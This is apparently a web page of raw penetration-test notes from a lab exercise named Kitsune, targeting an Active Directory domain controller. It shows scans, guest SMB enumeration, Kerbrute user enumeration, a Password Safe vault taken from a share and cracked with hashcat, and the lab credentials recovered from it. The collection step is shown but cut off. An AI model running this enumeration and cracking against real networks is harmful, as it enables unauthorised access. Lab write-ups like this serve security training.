@@ -1,0 +1,1878 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Kitsune Raw Notes — Manthan Bhatt</title>
+<meta name="description" content="Unedited engagement notes from the HackSmarter Kitsune lab.">
+<link rel="icon" href="/favicon.svg">
+<script>try{var t=localStorage.getItem('theme');if(t==='dark'||(!t&&matchMedia('(prefers-color-scheme: dark)').matches))document.documentElement.classList.add('dark')}catch(e){}</script>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Serif:wght@600&family=IBM+Plex+Sans:wght@400;600&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+:root{--paper:#F5F4F0;--paper-dim:#ECEAE3;--ink:#14151A;--ink-soft:#4A4A47;--line:#C9C7BE;--stamp:#9C2B2B;--accent-muted:#6B6455}
+:root.dark{--paper:#1A1A18;--paper-dim:#232320;--ink:#EDEBE4;--ink-soft:#A8A69C;--line:#3A3935;--stamp:#D4645F;--accent-muted:#8C8778}
+*{box-sizing:border-box}body{margin:0;background:var(--paper);color:var(--ink);font-family:'IBM Plex Sans',sans-serif;line-height:1.6}
+.wrap{max-width:920px;margin:0 auto;padding:0 24px 64px}
+.top{display:flex;justify-content:space-between;padding:20px 0;border-bottom:1px solid var(--line);font-family:'IBM Plex Mono',monospace;font-size:12px;letter-spacing:.08em;text-transform:uppercase}
+.top a{color:var(--ink-soft);text-decoration:none}.top a:hover{color:var(--ink)}
+.banner{border-left:2px solid var(--stamp);background:var(--paper-dim);padding:14px 18px;margin:28px 0;font-size:14.5px;color:var(--ink-soft)}
+.banner b{font-family:'IBM Plex Mono',monospace;font-size:11px;letter-spacing:.1em;text-transform:uppercase;color:var(--stamp);display:block;margin-bottom:4px;font-weight:500}
+#out h1,#out h2{font-family:'IBM Plex Serif',serif;font-weight:600;border-top:1px solid var(--line);padding-top:22px;margin-top:36px}
+#out h3,#out h4{font-family:'IBM Plex Mono',monospace;font-size:14px;letter-spacing:.04em;margin-top:26px}
+#out p,#out li{color:var(--ink-soft);font-size:15px}
+#out code{font-family:'IBM Plex Mono',monospace;font-size:12.5px;background:var(--paper-dim);padding:1px 4px}
+#out pre{background:var(--paper-dim);border:1px solid var(--line);padding:12px 14px;overflow-x:auto;font-size:12px;line-height:1.5}
+#out pre code{background:none;padding:0}
+#out img{max-width:100%;border:1px solid var(--line);display:block;margin:14px 0}
+#out table{border-collapse:collapse;font-size:13.5px}#out td,#out th{border:1px solid var(--line);padding:6px 8px}
+</style></head><body><div class="wrap">
+<nav class="top"><a href="./">← Kitsune case file</a><a href="/#writeups">Case files</a></nav>
+<div class="banner"><b>Raw notes</b>These are my unedited notes, written live during the engagement. Some early conclusions changed later: the certipy timeouts turned out to be my local network, not the lab. Flags are redacted. The case file and the Medium post were written with the help of AI from these notes.</div>
+<div id="out"></div></div>
+<script type="text/markdown" id="md"># Target
+- Box / room: Kitsune 
+- IP / vhost: 10.0.30.161
+- Difficulty: Easy
+
+# Recon
+<!-- paste raw tool output as you run it: rustscan, nmap, ffuf/gobuster, whatever -->
+## Rustscan
+```bash
+[manthan@manthanbhatt ~]$ rustscan -a 10.0.30.161 -- -sC -A
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+________________________________________
+: http://discord.skerritt.blog         :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+RustScan: Making sure 'closed' isn't just a state of mind.
+
+[~] The config file is expected to be at "/home/manthan/.rustscan.toml"
+[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
+Open 10.0.30.161:53
+Open 10.0.30.161:88
+Open 10.0.30.161:135
+Open 10.0.30.161:139
+Open 10.0.30.161:389
+Open 10.0.30.161:445
+Open 10.0.30.161:464
+Open 10.0.30.161:5985
+Open 10.0.30.161:9389
+Open 10.0.30.161:49671
+Open 10.0.30.161:49672
+Open 10.0.30.161:49675
+Open 10.0.30.161:49676
+Open 10.0.30.161:49699
+Open 10.0.30.161:49704
+Open 10.0.30.161:49721
+Open 10.0.30.161:49791
+[~] Starting Script(s)
+[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sC -A" on ip 10.0.30.161
+Depending on the complexity of the script, results may take some time to appear.
+[~] Starting Nmap 7.993 ( https://nmap.org ) at 2026-11-06 11:51 +0530
+NSE: Loaded 159 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 11:51
+Completed NSE at 11:51, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 11:51
+Completed NSE at 11:51, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 11:51
+Completed NSE at 11:51, 0.00s elapsed
+Initiating Ping Scan at 11:51
+Scanning 10.0.30.161 [2 ports]
+Completed Ping Scan at 11:51, 3.00s elapsed (1 total hosts)
+mass_dns: Using DNS server 10.158.79.20
+mass_dns: Using DNS server 2409:40c1:5453:39d9::6f
+Initiating Parallel DNS resolution of 0 hosts. at 11:51
+Completed Parallel DNS resolution of 0 hosts. at 11:51, 0.00s elapsed
+Nmap scan report for 10.0.30.161 [host down, received no-response]
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 11:51
+Completed NSE at 11:51, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 11:51
+Completed NSE at 11:51, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 11:51
+Completed NSE at 11:51, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
+Nmap done: 1 IP address (0 hosts up) scanned in 3.11 seconds
+
+[manthan@manthanbhatt ~]$ 
+```
+Nothing much useful.
+
+## Nmap
+```bash
+[manthan@manthanbhatt ~]$ nmap -sC -sV -Pn 10.0.30.161
+Nmap scan report for 10.0.30.161
+Host is up (0.35s latency).
+Not shown: 987 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-06 06:32:52Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: kitsune.local, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.kitsune.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.kitsune.local
+| Not valid before: 2026-10-12T21:14:40
+|_Not valid after:  2027-10-12T21:14:40
+|_ssl-date: TLS randomness does not represent time
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: kitsune.local, Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=DC01.kitsune.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.kitsune.local
+| Not valid before: 2026-10-12T21:14:40
+|_Not valid after:  2027-10-12T21:14:40
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: kitsune.local, Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=DC01.kitsune.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.kitsune.local
+| Not valid before: 2026-10-12T21:14:40
+|_Not valid after:  2027-10-12T21:14:40
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: kitsune.local, Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=DC01.kitsune.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.kitsune.local
+| Not valid before: 2026-10-12T21:14:40
+|_Not valid after:  2027-10-12T21:14:40
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=DC01.kitsune.local
+| Not valid before: 2026-10-11T08:21:43
+|_Not valid after:  2027-04-12T08:21:43
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+|_clock-skew: 24s
+| smb2-time: 
+|   date: 2026-11-06T06:33:38
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 108.85 seconds
+[manthan@manthanbhatt ~]$ 
+```
+
+### Port Details:
+```
+445: SMB
+464: handles **Kerberos password changes**
+5985: WinRM
+9389: AD Web Services
+```
+
+## DC Info
+```
+DC: DC01.kitsune.local
+Domain: kitsune.local
+```
+
+## NXC 
+### Null Session Enum:
+```bash
+[manthan@manthanbhatt ~]$ nxc smb 10.0.30.161 -u '' -p '' 
+SMB         10.0.30.161     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
+SMB         10.0.30.161     445    DC01             [+] kitsune.local\: 
+[manthan@manthanbhatt ~]$ 
+```
+
+### Enum Domain Users
+#### Using Kerbrute
+```bash
+[manthan@manthanbhatt Kitsune]$ kerbrute userenum -d kitsune.local --dc DC01.kitsune.local /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -o valid_users.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (n/a) - 11/06/26 - Ronnie Flathers @ropnop
+
+2026/11/06 12:28:22 >  Using KDC(s):
+2026/11/06 12:28:22 >  	DC01.kitsune.local:88
+
+2026/11/06 12:28:22 >  [+] VALID USERNAME:	administrator@kitsune.local
+2026/11/06 12:28:22 >  [!] guest@kitsune.local - KRB Error: (14) KDC_ERR_ETYPE_NOSUPP KDC has no support for encryption type
+2026/11/06 12:28:23 >  Done! Tested 17 usernames (1 valid) in 0.735 seconds
+[manthan@manthanbhatt Kitsune]$ 
+```
+
+### Usernames:
+```
+administrator@kitsune.local
+guest@kitsune.local
+```
+
+### Password Enum for `administrator`
+- **Using impacket**
+```bash
+[manthan@manthanbhatt Kitsune]$ GetNPUsers.py kitsune.local/administrator -dc-ip 10.0.30.161 -no-pass   
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Getting TGT for administrator
+[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+[manthan@manthanbhatt Kitsune]$ 
+```
+
+#### Successful Auth
+```bash
+[manthan@manthanbhatt Kitsune]$ nxc smb 10.0.30.161 -u guest -p ''
+SMB         10.0.30.161     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
+SMB         10.0.30.161     445    DC01             [+] kitsune.local\guest:
+```
+
+### Creds:
+```
+administrator: 
+guest:'' (empty)
+```
+
+### User Enum:
+```bash
+[manthan@manthanbhatt Kitsune]$ nxc smb 10.0.30.161 -u guest -p '' --shares
+SMB         10.0.30.161     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
+SMB         10.0.30.161     445    DC01             [+] kitsune.local\guest: 
+SMB         10.0.30.161     445    DC01             [*] Enumerated shares
+SMB         10.0.30.161     445    DC01             Share           Permissions            Remark
+SMB         10.0.30.161     445    DC01             -----           -----------            ------
+SMB         10.0.30.161     445    DC01             ADMIN$                                 Remote Admin
+SMB         10.0.30.161     445    DC01             C$                                     Default share
+SMB         10.0.30.161     445    DC01             Files           READ                   Global file share
+SMB         10.0.30.161     445    DC01             IPC$            READ                   Remote IPC
+SMB         10.0.30.161     445    DC01             NETLOGON                               Logon server share 
+SMB         10.0.30.161     445    DC01             SYSVOL                                 Logon server share 
+[manthan@manthanbhatt Kitsune]$ 
+```
+
+```bash
+[manthan@manthanbhatt Kitsune]$ nxc smb 10.0.30.161 -u guest -p '' --pass-pol
+SMB         10.0.30.161     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
+SMB         10.0.30.161     445    DC01             [+] kitsune.local\guest: 
+[manthan@manthanbhatt Kitsune]$ 
+```
+No info related to password policy, let's assume standard, lockout threshold - 3 
+
+```bash
+[manthan@manthanbhatt Kitsune]$ nxc smb 10.0.30.161 -u guest -p '' --groups
+SMB         10.0.30.161     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
+SMB         10.0.30.161     445    DC01             [+] kitsune.local\guest: 
+SMB         10.0.30.161     445    DC01             [-] [REMOVED] Arg moved to the ldap protocol
+[manthan@manthanbhatt Kitsune]$ 
+```
+
+### Loot for bloodHound
+```bash
+[manthan@manthanbhatt Kitsune]$ nxc ldap 10.0.30.161 -u 'guest' -p '' --bloodhound --collection ALL --dns-server 10.0.30.161
+LDAP        10.0.30.161     389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:kitsune.local) (signing:Enforced) (channel binding:Never) 
+LDAP        10.0.30.161     389    DC01             [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090D9D, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v65f4
+LDAP        10.0.30.161     389    DC01             [+] kitsune.local\guest: 
+LDAP        10.0.30.161     389    DC01             Resolved collection methods: acl, adcs, container, dcom, group, localadmin, loggedon, objectprops, psremote, rdp, session, trusts
+LDAP        10.0.30.161     389    DC01             Excluded collection methods: 
+LDAP        10.0.30.161     389    DC01             [-] BloodHound collection failed: LDAPUnknownAuthenticationMethodError - NTLM needs domain\username and a password
+[manthan@manthanbhatt Kitsune]$ 
+```
+**`What happened:`** Guest account is not a member of Domain Users so of no use for BloodHound
+
+### trying kerberosting on guest acc to see if we can find something useful
+```bash
+[manthan@manthanbhatt Kitsune]$ nxc ldap 10.0.30.161 -u 'guest' -p '' --kerberoasting output.txt
+LDAP        10.0.30.161     389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:kitsune.local) (signing:Enforced) (channel binding:Never) 
+LDAP        10.0.30.161     389    DC01             [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090D9D, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v65f4
+LDAP        10.0.30.161     389    DC01             [+] kitsune.local\guest: 
+LDAP        10.0.30.161     389    DC01             [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090D9D, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v65f4
+LDAP        10.0.30.161     389    DC01             No entries found!
+[manthan@manthanbhatt Kitsune]$ 
+```
+
+### Data dump the Files share using `guest` user
+```bash
+[manthan@manthanbhatt Kitsune]$ smbclient //10.0.30.161/Files -U guest%
+Can't load /etc/samba/smb.conf - run testparm to debug it
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Tue Oct 13 09:38:20 2026
+  ..                                DHS        0  Thu Oct 15 16:19:47 2026
+  10-11-Calendar_October.pdf          A     3190  Tue Oct 13 07:53:43 2026
+  10-11-Financial_Report.pdf          A     4076  Tue Oct 13 07:53:49 2026
+  10-11-Timesheet.pdf                 A     3854  Tue Oct 13 07:51:23 2026
+  logins.psafe3                       A      840  Tue Oct 13 07:29:03 2026
+
+		12974591 blocks of size 4096. 3534243 blocks available
+smb: \> print logins.psafe3
+NT_STATUS_ACCESS_DENIED opening remote file logins.psafe3
+smb: \> print 10-11-Financial_Report.pdf
+NT_STATUS_ACCESS_DENIED opening remote file 10-11-Financial_Report.pdf
+smb: \> ls -la
+NT_STATUS_NO_SUCH_FILE listing \-la
+smb: \> get logins.psafe3
+getting file \logins.psafe3 of size 840 as logins.psafe3 (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
+smb: \> 
+```
+
+### Checking the `logins.psafe3`
+```bash
+[manthan@manthanbhatt Kitsune]$ file logins.psafe3 
+logins.psafe3: Password Safe V3 database
+[manthan@manthanbhatt Kitsune]$ hashcat -m 5200 logins.psafe3 /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt
+```
+
+```
+logins.psafe3:hellokitty (master vault password)
+```
+
+Trying to open the vault (install pwsafe)
+```bash
+[manthan@manthanbhatt Kitsune]$ yay -S passwordsafe
+[manthan@manthanbhatt Kitsune]$ pwsafe logins.psafe3 
+```
+![](img/01-pwsafe-unlock-hellokitty.png)
+
+![](img/02-pwsafe-vault-entries.png)
+
+#### Creds
+```
+admin:I#zmE{z[n3HM
+ranch:R@nch2026!
+root:a%KlRhqbuRgL
+```
+
+### Valid Creds
+```bash
+[manthan@manthanbhatt Kitsune]$ nxc smb 10.0.30.161 -u ranch -p 'R@nch2026!'
+SMB         10.0.30.161     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
+SMB         10.0.30.161     445    DC01             [+] kitsune.local\ranch:R@nch2026! 
+[manthan@manthanbhatt Kitsune]$ 
+```
+
+```bash
+[manthan@manthanbhatt Kitsune]$ nxc smb 10.0.30.161 -u admin -p 'I#zmE{z[n3HM'
+SMB         10.0.30.161     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
+SMB         10.0.30.161     445    DC01             [+] kitsune.local\admin:I#zmE{z[n3HM (Guest)
+[manthan@manthanbhatt Kitsune]$ 
+```
+
+```bash
+[manthan@manthanbhatt Kitsune]$ nxc smb 10.0.30.161 -u root -p 'a%KlRhqbuRgL'
+SMB         10.0.30.161     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
+SMB         10.0.30.161     445    DC01             [+] kitsune.local\root:a%KlRhqbuRgL (Guest)
+[manthan@manthanbhatt Kitsune]$ 
+```
+
+## Starting with `Ranch`
+**Groups part of**:
+```bash
+[manthan@manthanbhatt Kitsune]$ nxc ldap 10.0.30.161 -u ranch -p 'R@nch2026!' --groups
+LDAP        10.0.30.161     389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:kitsune.local) (signing:Enforced) (channel binding:Never) 
+LDAP        10.0.30.161     389    DC01             [+] kitsune.local\ranch:R@nch2026! 
+LDAP        10.0.30.161     389    DC01             -Group-                                  -Members- -Description-                                               
+LDAP        10.0.30.161     389    DC01             Administrators                           3         Administrators have complete and unrestricted access to the computer/domain
+LDAP        10.0.30.161     389    DC01             Users                                    3         Users are prevented from making accidental or intentional system-wide changes and can run most applications
+LDAP        10.0.30.161     389    DC01             Guests                                   2         Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted
+LDAP        10.0.30.161     389    DC01             Print Operators                          0         Members can administer printers installed on domain controllers
+LDAP        10.0.30.161     389    DC01             Backup Operators                         1         Backup Operators can override security restrictions for the sole purpose of backing up or restoring files
+LDAP        10.0.30.161     389    DC01             Replicator                               0         Supports file replication in a domain
+LDAP        10.0.30.161     389    DC01             Remote Desktop Users                     0         Members in this group are granted the right to logon remotely
+LDAP        10.0.30.161     389    DC01             Network Configuration Operators          0         Members in this group can have some administrative privileges to manage configuration of networking features
+LDAP        10.0.30.161     389    DC01             Performance Monitor Users                0         Members of this group can access performance counter data locally and remotely
+LDAP        10.0.30.161     389    DC01             Performance Log Users                    0         Members of this group may schedule logging of performance counters, enable trace providers, and collect event traces both locally and via remote access to this computer
+LDAP        10.0.30.161     389    DC01             Distributed COM Users                    0         Members are allowed to launch, activate and use Distributed COM objects on this machine.
+LDAP        10.0.30.161     389    DC01             IIS_IUSRS                                1         Built-in group used by Internet Information Services.
+LDAP        10.0.30.161     389    DC01             Cryptographic Operators                  0         Members are authorized to perform cryptographic operations.
+LDAP        10.0.30.161     389    DC01             Event Log Readers                        0         Members of this group can read event logs from local machine
+LDAP        10.0.30.161     389    DC01             Certificate Service DCOM Access          1         Members of this group are allowed to connect to Certification Authorities in the enterprise
+LDAP        10.0.30.161     389    DC01             RDS Remote Access Servers                0         Servers in this group enable users of RemoteApp programs and personal virtual desktops access to these resources. In Internet-facing deployments, these servers are typically deployed in an edge network. This group needs to be populated on servers running RD Connection Broker. RD Gateway servers and RD Web Access servers used in the deployment need to be in this group.
+LDAP        10.0.30.161     389    DC01             RDS Endpoint Servers                     0         Servers in this group run virtual machines and host sessions where users RemoteApp programs and personal virtual desktops run. This group needs to be populated on servers running RD Connection Broker. RD Session Host servers and RD Virtualization Host servers used in the deployment need to be in this group.
+LDAP        10.0.30.161     389    DC01             RDS Management Servers                   0         Servers in this group can perform routine administrative actions on servers running Remote Desktop Services. This group needs to be populated on all servers in a Remote Desktop Services deployment. The servers running the RDS Central Management service must be included in this group.
+LDAP        10.0.30.161     389    DC01             Hyper-V Administrators                   0         Members of this group have complete and unrestricted access to all features of Hyper-V.
+LDAP        10.0.30.161     389    DC01             Access Control Assistance Operators      0         Members of this group can remotely query authorization attributes and permissions for resources on this computer.
+LDAP        10.0.30.161     389    DC01             Remote Management Users                  1         Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
+LDAP        10.0.30.161     389    DC01             Storage Replica Administrators           0         Members of this group have complete and unrestricted access to all features of Storage Replica.
+LDAP        10.0.30.161     389    DC01             OpenSSH Users                            0         Members of this group may connect to this computer using SSH.
+LDAP        10.0.30.161     389    DC01             Domain Computers                         0         All workstations and servers joined to the domain
+LDAP        10.0.30.161     389    DC01             Domain Controllers                       0         All domain controllers in the domain
+LDAP        10.0.30.161     389    DC01             Schema Admins                            1         Designated administrators of the schema
+LDAP        10.0.30.161     389    DC01             Enterprise Admins                        1         Designated administrators of the enterprise
+LDAP        10.0.30.161     389    DC01             Cert Publishers                          1         Members of this group are permitted to publish certificates to the directory
+LDAP        10.0.30.161     389    DC01             Domain Admins                            1         Designated administrators of the domain
+LDAP        10.0.30.161     389    DC01             Domain Users                             0         All domain users
+LDAP        10.0.30.161     389    DC01             Domain Guests                            0         All domain guests
+LDAP        10.0.30.161     389    DC01             Group Policy Creator Owners              1         Members in this group can modify group policy for the domain
+LDAP        10.0.30.161     389    DC01             RAS and IAS Servers                      0         Servers in this group can access remote access properties of users
+LDAP        10.0.30.161     389    DC01             Server Operators                         0         Members can administer domain servers
+LDAP        10.0.30.161     389    DC01             Account Operators                        0         Members can administer domain user and group accounts
+LDAP        10.0.30.161     389    DC01             Pre-Windows 2000 Compatible Access       2         A backward compatibility group which allows read access on all users and groups in the domain
+LDAP        10.0.30.161     389    DC01             Incoming Forest Trust Builders           0         Members of this group can create incoming, one-way trusts to this forest
+LDAP        10.0.30.161     389    DC01             Windows Authorization Access Group       1         Members of this group have access to the computed tokenGroupsGlobalAndUniversal attribute on User objects
+LDAP        10.0.30.161     389    DC01             Terminal Server License Servers          0         Members of this group can update user accounts in Active Directory with information about license issuance, for the purpose of tracking and reporting TS Per User CAL usage
+LDAP        10.0.30.161     389    DC01             Allowed RODC Password Replication Group  0         Members in this group can have their passwords replicated to all read-only domain controllers in the domain
+LDAP        10.0.30.161     389    DC01             Denied RODC Password Replication Group   8         Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
+LDAP        10.0.30.161     389    DC01             Read-only Domain Controllers             0         Members of this group are Read-Only Domain Controllers in the domain
+LDAP        10.0.30.161     389    DC01             Enterprise Read-only Domain Controllers  0         Members of this group are Read-Only Domain Controllers in the enterprise
+LDAP        10.0.30.161     389    DC01             Cloneable Domain Controllers             0         Members of this group that are domain controllers may be cloned.
+LDAP        10.0.30.161     389    DC01             Protected Users                          0         Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.
+LDAP        10.0.30.161     389    DC01             Key Admins                               0         Members of this group can perform administrative actions on key objects within the domain.
+LDAP        10.0.30.161     389    DC01             Enterprise Key Admins                    0         Members of this group can perform administrative actions on key objects within the forest.
+LDAP        10.0.30.161     389    DC01             Forest Trust Accounts                    0         All forest trust accounts in the forest.
+LDAP        10.0.30.161     389    DC01             External Trust Accounts                  0         All external trust accounts in the domain.
+LDAP        10.0.30.161     389    DC01             DnsAdmins                                0         DNS Administrators Group
+LDAP        10.0.30.161     389    DC01             DnsUpdateProxy                           0         DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).
+LDAP        10.0.30.161     389    DC01             HelpDesk                                 0         
+LDAP        10.0.30.161     389    DC01             IT                                       1         
+[manthan@manthanbhatt Kitsune]$ 
+```
+### Loot for bloodHound
+```bash
+[manthan@manthanbhatt Kitsune]$ nxc ldap 10.0.30.161 -u ranch -p 'R@nch2026!' --bloodhound --collection All --dns-server 10.0.30.161
+LDAP        10.0.30.161     389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:kitsune.local) (signing:Enforced) (channel binding:Never) 
+LDAP        10.0.30.161     389    DC01             [+] kitsune.local\ranch:R@nch2026! 
+LDAP        10.0.30.161     389    DC01             Resolved collection methods: acl, adcs, container, dcom, group, localadmin, loggedon, objectprops, psremote, rdp, session, trusts
+LDAP        10.0.30.161     389    DC01             Excluded collection methods: 
+LDAP        10.0.30.161     389    DC01             [-] BloodHound collection failed: LDAPSocketOpenError - socket ssl wrapping error: _ssl.c:1064: The handshake operation timed out
+```
+
+Trying with rusthound-ce
+```bash
+[manthan@manthanbhatt Kitsune]$ rusthound-ce -d kitsune.local -u 'ranch' -p 'R@nch2026!' -n 10.0.30.161 -o ./bloodhound_loot/
+---------------------------------------------------
+Initializing RustHound-CE at 14:53:42 on 11/06/26
+Powered by @g0h4n_0
+---------------------------------------------------
+
+[2026-11-06T09:23:42Z INFO  rusthound_ce] Verbosity level: Info
+[2026-11-06T09:23:42Z INFO  rusthound_ce] Collection method: All
+[2026-11-06T09:23:42Z INFO  rusthound_ce::transport] Transport: LDAP
+Error: "authentication to KITSUNE.LOCAL failed: LDAP operation result: rc=8 (strongerAuthRequired), dn: \"\", text: \"00002028: LdapErr: DSID-0C090360, comment: The server requires binds to turn on integrity checking if SSL\\TLS are not already active on the connection, data 0, v65f4\0\""
+[manthan@manthanbhatt Kitsune]$ 
+```
+
+```bash
+[manthan@manthanbhatt ~]$ rusthound-ce -d kitsune.local -u 'ranch' -p 'R@nch2026!' -f DC01.kitsune.local --ldaps -o ./bloodhound_loot/ -z
+---------------------------------------------------
+Initializing RustHound-CE at 15:03:57 on 11/06/26
+Powered by @g0h4n_0
+---------------------------------------------------
+
+[2026-11-06T09:33:57Z INFO  rusthound_ce] Verbosity level: Info
+[2026-11-06T09:33:57Z INFO  rusthound_ce] Collection method: All
+[2026-11-06T09:33:58Z INFO  rusthound_ce::transport::ldap] Connected to KITSUNE.LOCAL Active Directory!
+[2026-11-06T09:33:58Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
+[2026-11-06T09:34:01Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=kitsune,DC=local
+[2026-11-06T09:34:01Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
+[2026-11-06T09:34:02Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext DC=kitsune,DC=local
+[2026-11-06T09:34:02Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
+[2026-11-06T09:34:02Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=kitsune,DC=local
+[2026-11-06T09:34:02Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
+[2026-11-06T09:34:02Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=kitsune,DC=local
+[2026-11-06T09:34:02Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
+[2026-11-06T09:34:04Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext CN=Configuration,DC=kitsune,DC=local
+[2026-11-06T09:34:04Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
+⡀ Parsing LDAP objects: 52%                                                                               [2026-11-06T09:34:04Z INFO  rusthound_ce::objects::enterpriseca] Found 12 enabled certificate templates
+[2026-11-06T09:34:04Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
+[2026-11-06T09:34:04Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
